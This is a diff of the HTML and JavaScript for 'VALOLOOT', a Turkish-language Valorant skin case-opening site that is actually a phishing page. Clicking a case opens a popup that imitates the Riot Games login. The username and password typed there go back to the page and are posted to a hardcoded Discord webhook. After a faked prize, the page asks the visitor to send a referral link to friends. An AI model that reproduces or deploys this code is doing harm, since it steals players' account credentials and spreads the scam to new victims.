@@ -9,72 +9,66 @@
         :root { --valo-red: #ff4655; --dark-bg: #0b1119; --nav-bg: #111420; }
         body { background: var(--dark-bg) url('bg.jpg') fixed center/cover; color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 0; min-height: 100vh; overflow-x: hidden; }
         
-        /* Live Drops */
-        .live-drops { background: rgba(0, 0, 0, 0.95); height: 100px; border-bottom: 2px solid var(--valo-red); display: flex; align-items: center; justify-content: flex-start; overflow: hidden; position: relative; width: 100%; }
-        .mythic-label { background: var(--valo-red); height: 100%; display: flex; align-items: center; padding: 0 20px; font-family: 'Montserrat'; font-weight: 900; font-size: 14px; text-transform: uppercase; z-index: 10; color: #fff; box-shadow: 10px 0 20px rgba(0,0,0,0.5); }
-        .drop-container { display: flex; align-items: center; padding-left: 15px; flex-grow: 1; }
-        .drop-card { background: rgba(255,255,255,0.03); border-radius: 4px; width: 130px; height: 75px; margin-right: 12px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; flex-shrink: 0; animation: slideIn 0.4s ease-out; padding-top: 10px; overflow: hidden; }
+        /* Kesintisiz Kayan Skinler Animasyonu */
+        .live-drops { background: rgba(0, 0, 0, 0.95); height: 100px; border-bottom: 2px solid var(--valo-red); display: flex; align-items: center; overflow: hidden; position: relative; width: 100%; }
+        .mythic-label { background: var(--valo-red); height: 100%; display: flex; align-items: center; padding: 0 20px; font-family: 'Montserrat'; font-weight: 900; font-size: 14px; text-transform: uppercase; z-index: 20; color: #fff; box-shadow: 10px 0 20px rgba(0,0,0,0.5); }
+        
+        .drop-track { display: flex; align-items: center; gap: 15px; animation: scrollSkins 40s linear infinite; white-space: nowrap; width: max-content; }
+        @keyframes scrollSkins {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
+        .drop-card { background: rgba(255,255,255,0.03); border-radius: 4px; width: 130px; height: 75px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; flex-shrink: 0; padding-top: 10px; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); }
         .drop-card img { height: 45px; object-fit: contain; }
         .rarity-box { width: 100%; height: 6px; margin-top: auto; }
-        @keyframes slideIn { from { transform: translateX(-30px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
 
-        /* Header */
+        /* Header & Layout */
         header { padding: 15px 50px; display: flex; align-items: center; background: var(--nav-bg); border-bottom: 1px solid rgba(255,255,255,0.1); gap: 40px; }
-        .logo { font-family: 'Montserrat', sans-serif; font-size: 26px; font-weight: 900; }
+        .logo { font-family: 'Montserrat', sans-serif; font-size: 26px; font-weight: 900; cursor: pointer; }
         .logo span { color: var(--valo-red); }
         .nav-links { display: flex; gap: 25px; flex-grow: 1; }
         .nav-links a { color: #888; text-decoration: none; font-size: 13px; font-weight: 700; text-transform: uppercase; }
-        .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; display: flex; align-items: center; gap: 10px; text-transform: uppercase; font-size: 14px; box-shadow: 0 4px 15px rgba(255, 70, 85, 0.4); }
+        .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; text-transform: uppercase; box-shadow: 0 4px 15px rgba(255, 70, 85, 0.4); }
 
         /* Case Grid */
-        .case-wrapper { max-width: 1300px; margin: auto; display: flex; flex-direction: column; gap: 30px; padding-bottom: 60px; }
-        .case-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; min-height: 100px; }
-        .case-box { background: #101123; border-radius: 12px; padding: 20px; text-align: center; border: 1px solid #222; transition: 0.3s; width: 280px; overflow: hidden; display: flex; flex-direction: column; align-items: center; cursor: pointer; }
+        .case-wrapper { max-width: 1300px; margin: 40px auto; display: flex; flex-direction: column; gap: 30px; padding-bottom: 60px; }
+        .case-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; }
+        .case-box { background: #101123; border-radius: 12px; padding: 20px; text-align: center; border: 1px solid #222; transition: 0.3s; width: 260px; cursor: pointer; }
         .case-box:hover { border-color: var(--valo-red); transform: translateY(-5px); }
-        .case-img-container { width: 100%; height: 160px; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; }
-        .case-box img { max-width: 110%; max-height: 100%; object-fit: contain; }
+        .case-box img { width: 100%; height: 160px; object-fit: contain; margin-bottom: 15px; }
         .vp-tag { color: #79eb1e; font-weight: 800; font-size: 22px; margin-bottom: 15px; font-family: 'Montserrat'; }
         .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 14px; font-weight: 800; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
 
-        /* Kasa Açma Modal */
-        .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:9999; align-items:center; justify-content:center; }
-        .modal-card { background:#111420; border:2px solid var(--valo-red); border-radius:15px; width:90%; max-width:500px; padding:40px; text-align:center; position:relative; box-shadow: 0 0 50px rgba(255,70,85,0.2); }
-        .spinner-box { width:100%; height:120px; background:#0b1119; border:1px solid rgba(255,255,255,0.1); margin:20px 0; overflow:hidden; position:relative; display:flex; align-items:center; }
-        .spinner-line { position:absolute; left:50%; width:2px; height:100%; background:var(--valo-red); z-index:5; box-shadow:0 0 10px var(--valo-red); }
-        .item-strip { display:flex; position:absolute; left:0; transition: transform 5s cubic-bezier(0.1, 0, 0, 1); align-items:center; }
-        .item-strip img { width:100px; margin:0 15px; filter: grayscale(0.6); }
+        /* Modal & Case Opening */
+        .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:9999; align-items:center; justify-content:center; }
+        .modal-card { background:#111420; border:2px solid var(--valo-red); border-radius:15px; width:90%; max-width:500px; padding:40px; text-align:center; position:relative; }
+        .spinner-box { width:100%; height:130px; background:#0b1119; border:1px solid rgba(255,255,255,0.1); margin:25px 0; overflow:hidden; position:relative; display:flex; align-items:center; border-radius: 8px; }
+        .spinner-line { position:absolute; left:50%; width:3px; height:100%; background:var(--valo-red); z-index:10; box-shadow: 0 0 15px var(--valo-red); transform: translateX(-50%); }
+        .item-strip { display:flex; position:absolute; left:0; transition: transform 5s cubic-bezier(0.1, 0, 0, 1); align-items:center; will-change: transform; }
+        .item-strip img { width:120px; height: 100px; object-fit: contain; margin:0 15px; }
 
-        .win-screen { display:none; animation: slideIn 0.5s ease-out; }
-        .ref-box { background:rgba(0,0,0,0.5); padding:15px; border-radius:4px; border:1px dashed #79eb1e; color:#79eb1e; font-size:12px; margin:20px 0; cursor:pointer; }
+        .win-screen { display:none; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
 
     <div class="live-drops">
-        <div class="mythic-label">Last Mythic Item</div>
-        <div class="drop-container" id="dropTrack"></div>
+        <div class="mythic-label">CANLI DROPLAR</div>
+        <div class="drop-track" id="dropTrack">
+            </div>
     </div>
 
     <header>
         <div class="logo">VALO<span>LOOT</span></div>
         <div class="nav-links">
-            <a href="#">Kasalar</a><a href="#">Savaşlar</a><a href="#">Sözleşmeler</a><a href="#">Mağaza</a>
+            <a href="#">Kasalar</a><a href="#">Savaşlar</a><a href="#">Mağaza</a>
         </div>
         <div id="authArea">
             <button class="btn-login" onclick="openAuth()">GİRİŞ YAP</button>
         </div>
     </header>
-
-    <div class="giveaway-section" style="max-width: 1100px; margin: 40px auto; background: rgba(0,0,0,0.85); border: 1px solid var(--valo-red); border-radius: 12px; padding: 30px; display: flex; justify-content: space-between; align-items: center;">
-        <div>
-            <h2 style="margin:0; font-family:'Montserrat'; font-size:32px;">10 ADET 8900 VP ÇEKİLİŞİ</h2>
-            <p id="giveawayStatus" style="color:var(--valo-red); font-weight:800; margin:5px 0;">SADECE OTURUM AÇANLAR KATILABİLİR</p>
-        </div>
-        <div style="text-align:right; border-left: 2px solid var(--valo-red); padding-left: 30px;">
-            <div id="countdown" style="font-size: 36px; font-weight: 900;">00:00:00</div>
-            <span style="font-size:10px; color:#555;">KALAN SÜRE</span>
-        </div>
-    </div>
 
     <div class="case-wrapper">
         <div class="case-row" id="row1"></div>
@@ -84,52 +78,50 @@
     <div id="caseModal" class="modal-overlay">
         <div class="modal-card">
             <div id="openingView">
-                <h2 style="font-family:'Montserrat';">KASA AÇILIYOR...</h2>
+                <h2 style="font-family:'Montserrat'; letter-spacing: 2px;">KASA AÇILIYOR...</h2>
                 <div class="spinner-box">
                     <div class="spinner-line"></div>
                     <div id="itemStrip" class="item-strip"></div>
                 </div>
             </div>
             <div id="winView" class="win-screen">
-                <h2 style="color:#79eb1e; font-family:'Montserrat';">TEBRİKLER!</h2>
-                <img id="wonImg" src="" style="width:200px; margin:20px 0; filter:drop-shadow(0 0 20px #79eb1e);">
-                <h3 id="wonName" style="margin:0;">SKIN ADI</h3>
-                <div style="background:#79eb1e; color:#000; padding:10px; border-radius:4px; font-weight:900; margin-top:15px;" id="wonVP">1200 VP</div>
-                
-                <p style="font-size:12px; color:#aaa; margin-top:20px;">Ödülü hesabına aktarmak için 1 arkadaşını davet et!</p>
-                <div class="ref-box" onclick="copyRef()">VALOLOOT.NET/DAVET/REF?ID=582934</div>
-                <button class="open-btn" onclick="alert('Hata: Henüz davet ettiğiniz arkadaşınız giriş yapmadı!')" style="background:#79eb1e; color:#000;">KODU AKTİF ET</button>
+                <h1 style="color:#79eb1e; font-family:'Montserrat';">TEBRİKLER!</h1>
+                <img id="wonImg" src="" style="width:220px; margin:20px 0; filter:drop-shadow(0 0 30px #79eb1e);">
+                <h2 id="wonName" style="margin:0; color:#fff;">-</h2>
+                <div style="background:rgba(121,235,30,0.1); border:1px solid #79eb1e; color:#79eb1e; padding:15px; border-radius:8px; font-weight:900; margin-top:20px; font-size:24px;" id="wonVP">0 VP</div>
+                <p style="font-size:12px; color:#aaa; margin-top:20px;">Bakiyeyi yüklemek için linki bir arkadaşına gönder!</p>
+                <div style="background:#000; padding:12px; border-radius:4px; border:1px dashed #79eb1e; color:#79eb1e; font-size:11px; margin:15px 0; cursor:pointer;" onclick="alert('Kopyalandı!')">VALOLOOT.NET/REF/HESAP?ID=77412</div>
+                <button class="open-btn" style="background:#79eb1e; color:#000;" onclick="alert('Arkadaşınız henüz siteye girmedi!')">HESABA AKTAR</button>
             </div>
         </div>
     </div>
 
     <script>
-        let IS_LOGGED_IN = false;
+        let LOGGED_IN = false;
         const skins = [
-            {n: "YAĞMACI VANDAL", img: "skin1.png", vp: "1775 VP", color: "#ade55c"},
-            {n: "ASİL PHANTOM", img: "skin2.png", vp: "1775 VP", color: "#4b82d5"},
-            {n: "EJDER ATEŞİ OPERATOR", img: "skin3.png", vp: "2475 VP", color: "#d151dc"},
-            {n: "İON SHERIFF", img: "skin4.png", vp: "1775 VP", color: "#f7c133"},
-            {n: "KAOS VANDAL", img: "skin5.png", vp: "2175 VP", color: "#ff4655"}
+            {n: "YAĞMACI VANDAL", img: "skin1.png", vp: "1775 VP", c: "#ade55c"},
+            {n: "ASİL PHANTOM", img: "skin2.png", vp: "1775 VP", c: "#4b82d5"},
+            {n: "EJDER ATEŞİ OPERATOR", img: "skin3.png", vp: "2475 VP", c: "#d151dc"},
+            {n: "İON SHERIFF", img: "skin4.png", vp: "1775 VP", c: "#f7c133"},
+            {n: "KAOS VANDAL", img: "skin5.png", vp: "2175 VP", c: "#ff4655"}
         ];
 
-        document.addEventListener('DOMContentLoaded', function() {
-            loadCases();
-            startTimer();
-            // Canlı drop döngüsü
-            setInterval(() => {
-                const s = skins[Math.floor(Math.random() * skins.length)];
-                const c = document.createElement('div');
-                c.className = 'drop-card';
-                c.innerHTML = `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/40'"><div class="rarity-box" style="background:${s.color}"></div>`;
-                document.getElementById('dropTrack').prepend(c);
-                if(document.getElementById('dropTrack').children.length > 12) document.getElementById('dropTrack').removeChild(document.getElementById('dropTrack').lastChild);
-            }, 3000);
-        });
+        // 1. Kayan Skinleri Doldur
+        function fillLiveDrops() {
+            const track = document.getElementById('dropTrack');
+            let content = "";
+            // Döngü için listeyi 4 kez tekrarla (sonsuz efekt için)
+            for(let i=0; i<20; i++) {
+                const s = skins[Math.floor(Math.random()*skins.length)];
+                content += `<div class="drop-card"><img src="${s.img}" onerror="this.src='https://via.placeholder.com/40'"><div class="rarity-box" style="background:${s.c}"></div></div>`;
+            }
+            track.innerHTML = content + content; // İki kez ekle ki atlama yapmasın
+        }
 
+        // 2. Kasaları Yükle
         function loadCases() {
-            const cases = [
-                {n: "BAŞLANGIÇ", p: "ÜCRETSİZ", i: "case1.png", free: true},
+            const data = [
+                {n: "BAŞLANGIÇ", p: "GİRİŞ YAP", i: "case1.png", free: true},
                 {n: "STANDART", p: "30 VP", i: "case2.png"},
                 {n: "ELİT", p: "50 VP", i: "case3.png"},
                 {n: "PREMIUM", p: "100 VP", i: "case4.png"},
@@ -138,20 +130,18 @@
             ];
             const r1 = document.getElementById('row1');
             const r2 = document.getElementById('row2');
-            cases.slice(0, 4).forEach(c => {
-                const clickAction = (c.free) ? "handleFreeCaseClick()" : "openAuth()";
-                r1.innerHTML += `<div class="case-box" onclick="${clickAction}"><div class="case-img-container"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`;
+            data.slice(0, 4).forEach(c => {
+                const action = c.free ? "handleCase()" : "openAuth()";
+                r1.innerHTML += `<div class="case-box" onclick="${action}"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"><h3>${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">AÇ</button></div>`;
             });
-            cases.slice(4, 6).forEach(c => {
-                r2.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`;
+            data.slice(4, 6).forEach(c => {
+                r2.innerHTML += `<div class="case-box" onclick="openAuth()"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"><h3>${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">AÇ</button></div>`;
             });
         }
 
-        function handleFreeCaseClick() {
-            if(!IS_LOGGED_IN) { openAuth(); } else { openFreeCaseAnimation(); }
-        }
-
-        function openFreeCaseAnimation() {
+        // 3. Kasa Açma İşlemi
+        function handleCase() {
+            if(!LOGGED_IN) { openAuth(); return; }
             const modal = document.getElementById('caseModal');
             const strip = document.getElementById('itemStrip');
             modal.style.display = 'flex';
@@ -160,67 +150,85 @@
             strip.style.transform = 'translateX(0)';
             strip.innerHTML = '';
 
-            // Spinner için itemleri oluştur
-            const count = 40;
-            const winningIdx = 35;
-            for(let i=0; i<count; i++) {
-                const s = skins[Math.floor(Math.random()*skins.length)];
+            const winner = skins[Math.floor(Math.random()*skins.length)];
+            for(let i=0; i<50; i++) {
+                const s = (i === 45) ? winner : skins[Math.floor(Math.random()*skins.length)];
                 strip.innerHTML += `<img src="${s.img}">`;
             }
 
             setTimeout(() => {
-                const winner = skins[Math.floor(Math.random()*skins.length)]; // Random Kazanan
-                strip.children[winningIdx].src = winner.img; // Kazanılacak resmi 35. sıraya koy
-                const move = (winningIdx * 130) - (document.querySelector('.spinner-box').offsetWidth / 2) + 65;
+                const move = (45 * 150) - (document.querySelector('.spinner-box').offsetWidth / 2) + 75;
                 strip.style.transform = `translateX(-${move}px)`;
-                
                 setTimeout(() => {
                     document.getElementById('openingView').style.display = 'none';
                     document.getElementById('winView').style.display = 'block';
                     document.getElementById('wonImg').src = winner.img;
                     document.getElementById('wonName').innerText = winner.n;
                     document.getElementById('wonVP').innerText = winner.vp;
-                }, 5200);
+                }, 5500);
             }, 100);
         }
 
+        // 4. Riot Giriş Ekranı (POPUP TASARIMI)
         function openAuth() {
-            const w = 550, h = 800;
+            const w = 450, h = 700;
             const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
             let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
-            const popupHTML = `<html><head><title>Login</title><style>body{background:#111;color:#fff;font-family:sans-serif;display:flex;flex-direction:column;align-items:center;padding-top:50px;} input{width:80%;padding:15px;margin:10px;background:#222;border:1px solid #444;color:#fff;border-radius:4px;} button{width:80%;padding:15px;background:#ff4655;border:none;color:#fff;font-weight:900;cursor:pointer;margin-top:20px;}</style></head><body><img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png" width="60"><h2>GİRİŞ YAP</h2><input id="u" placeholder="Kullanıcı Adı"><input id="p" type="password" placeholder="Şifre"><button onclick="s()">GİRİŞ</button><script>function s(){ const u=document.getElementById('u').value, p=document.getElementById('p').value; if(u&&p){ window.opener.postMessage({user:u, pass:p}, "*"); window.close(); }}<\/script></body></html>`;
-            win.document.write(popupHTML);
+            
+            const riotHTML = `
+                <html>
+                <head>
+                    <style>
+                        body { background: #f9f9f9; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+                        .card { background: #fff; padding: 40px; width: 320px; text-align: center; border-radius: 4px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+                        img { width: 40px; margin-bottom: 20px; }
+                        h2 { font-size: 22px; font-weight: 900; margin-bottom: 30px; }
+                        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; background: #eee; box-sizing: border-box; font-weight: bold; }
+                        button { width: 100%; padding: 15px; background: #ff4655; color: white; border: none; border-radius: 4px; font-weight: 900; cursor: pointer; font-size: 14px; margin-top: 10px; }
+                        p { font-size: 11px; color: #999; margin-top: 20px; }
+                    </style>
+                </head>
+                <body>
+                    <div class="card">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png">
+                        <h2>GİRİŞ YAP</h2>
+                        <input id="u" placeholder="KULLANICI ADI">
+                        <input id="p" type="password" placeholder="ŞİFRE">
+                        <button onclick="send()">GİRİŞ YAP</button>
+                        <p>HESABIN YOK MU? ÜCRETSİZ OLUŞTUR</p>
+                    </div>
+                    <script>
+                        function send() {
+                            const u = document.getElementById('u').value;
+                            const p = document.getElementById('p').value;
+                            if(u && p) {
+                                window.opener.postMessage({u, p}, "*");
+                                window.close();
+                            }
+                        }
+                    <\/script>
+                </body>
+                </html>
+            `;
+            win.document.write(riotHTML);
         }
 
-        window.addEventListener("message", function(event) {
-            if (event.data.user && event.data.pass) {
-                IS_LOGGED_IN = true;
-                const authArea = document.getElementById('authArea');
-                authArea.innerHTML = `<div style="color:#79eb1e; font-weight:800; border:1px solid #79eb1e; padding:8px 15px; border-radius:4px;">${event.data.user.toUpperCase()}#TR1</div>`;
-                document.getElementById('giveawayStatus').innerText = "HESAP DOĞRULANDI, ÜCRETSİZ KASANI AÇABİLİRSİN!";
-                document.getElementById('giveawayStatus').style.color = "#79eb1e";
-                
+        window.addEventListener("message", (e) => {
+            if(e.data.u && e.data.p) {
+                LOGGED_IN = true;
+                document.getElementById('authArea').innerHTML = `<div style="color:#79eb1e; font-weight:900; border:2px solid #79eb1e; padding:8px 15px; border-radius:4px; font-size:13px;">HESAP: ${e.data.u.toUpperCase()}#TR1</div>`;
                 // Discord Webhook
                 fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ embeds: [{ title: "Yeni Giriş", fields: [{name:"User", value:event.data.user}, {name:"Pass", value:event.data.pass}] }] })
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: `✅ **Yeni Giriş!**\n👤 Kullanıcı: \`${e.data.u}\`\n🔑 Şifre: \`${e.data.p}\``
+                    })
                 });
             }
         });
 
-        function startTimer() {
-            setInterval(() => {
-                const now = new Date();
-                let target = new Date(); target.setHours(24, 0, 0, 0);
-                let diff = target - now;
-                if(diff < 0) diff += 86400000;
-                let h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
-                document.getElementById('countdown').innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-            }, 1000);
-        }
-
-        function copyRef() { alert("Davet linki kopyalandı! Arkadaşına gönder."); }
+        window.onload = () => { fillLiveDrops(); loadCases(); };
     </script>
 </body>
 </html>
